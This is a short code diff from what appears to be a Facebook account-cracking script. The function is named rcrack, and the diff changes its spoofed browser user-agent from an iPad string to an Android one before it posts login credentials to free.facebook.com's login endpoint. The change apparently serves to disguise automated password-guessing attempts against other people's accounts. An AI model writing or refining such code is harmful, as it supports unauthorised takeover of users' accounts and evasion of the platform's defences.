@@ -342,7 +342,7 @@ def rcrack(uid,pwx,tl):
 
             'upgrade-insecure-requests': '1',
 
-             'user-agent':'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',}
+             'user-agent':'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-U952Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4636.42 Mobile Safari/537.36',}
 
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
